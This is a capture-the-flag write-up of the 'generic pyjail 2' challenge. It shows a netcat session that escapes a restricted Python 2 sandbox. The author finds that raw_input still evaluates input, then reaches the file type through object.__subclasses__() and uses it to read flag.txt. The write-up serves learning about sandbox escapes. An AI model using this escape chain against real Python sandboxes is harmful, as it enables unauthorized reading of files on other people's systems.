## generic pyjail 2
> how unoriginal do you have to be to make two of these

> nc chall2.2019.redpwn.net 6007

Let's again throw some random input at it and figure out what's happening.
```
$ nc chall2.2019.redpwn.net 6007
wow! again, there's a file called flag.txt! insane!
a
now it's  a !
Exception:  name 'a' is not defined
'
now it's  ' !
Exception:  EOL while scanning string literal (<string>, line 1)
exit()
now it's  exit() !

$ nc chall2.2019.redpwn.net 6007
wow! again, there's a file called flag.txt! insane!
__import__('os')
now it's  __import__('os') !
Exception:  name '__import__' is not defined
a b      
no spaces!

$ nc chall2.2019.redpwn.net 6007
wow! again, there's a file called flag.txt! insane!
input
now it's  input !
Exception:  name 'input' is not defined
raw_input
now it's  raw_input !
raw_input('enter:')
now it's  raw_input('enter:') !
enter:hello
test
now it's  test !
Exception:  name 'test' is not defined
```
`raw_input()` get's executed.
```
$ nc chall2.2019.redpwn.net 6007
wow! again, there's a file called flag.txt! insane!
raw_input(globals())
now it's  raw_input(globals()) !
{'gone': ['open', 'file', 'execfile', 'compile', 'reload', '__import__', 'eval', 'input'], '__builtins__': <module '__builtin__' (built-in)>, '__file__': 'jail2.py', '__package__': None, 'func': 'input', 'x': 'raw_input(globals())', '__name__': '__main__', '__doc__': None}
raw_input(().__class__.__bases__)
now it's  raw_input(().__class__.__bases__) !
(<type 'object'>,)
raw_input(().__class__.__bases__[0].__subclasses__())
now it's  raw_input(().__class__.__bases__[0].__subclasses__()) !
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
raw_input(().__class__.__bases__[0].__subclasses__()[40]('flag.txt').read())
now it's  raw_input(().__class__.__bases__[0].__subclasses__()[40]('flag.txt').read()) !
flag{sub_sub_sub_references}
```
